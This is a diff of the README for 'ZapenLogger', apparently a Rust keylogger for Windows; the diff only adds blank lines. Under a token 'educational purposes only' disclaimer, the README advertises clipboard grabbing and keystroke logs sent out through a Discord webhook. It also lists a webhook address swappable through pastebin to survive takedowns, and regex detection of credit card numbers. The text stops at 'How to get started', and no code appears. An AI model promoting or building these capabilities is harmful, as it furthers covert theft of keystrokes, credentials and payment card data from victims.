@@ -1,15 +1,21 @@
 **ZapenLogger** - Advanced Windows Keylogger For Discord
 
 ***DISCLAIMER***
+
 _I am not responsible for any, lawful or not, use of this code/application by any third-party._
 _I provide this code without any warranty and for educational purposes only._
 _I am strictly against using provided code for gaining access to unauthorized information._
 
 ⭐ **Features:**
+
 📋 Clipboard grabbing
+
 ⌨️ Sending logs on enter/buffer overflow/5 minute timeout
+
 🔁 Swappable discord webhook using pastebin
+
 💳 Detect potential credit card credentials using regex (sequence of three digits, sequence of sixteen digits and double digits divided by "/" symbol)
+
 🦀 Written in rust, which means it's blazingly fast and doesn't need any runtime to execute. You just run the program and it executes, no pyinstaller, no dotnet, no any crap from interpreted/bytecode languages.
 
 🪖 **How to get started**
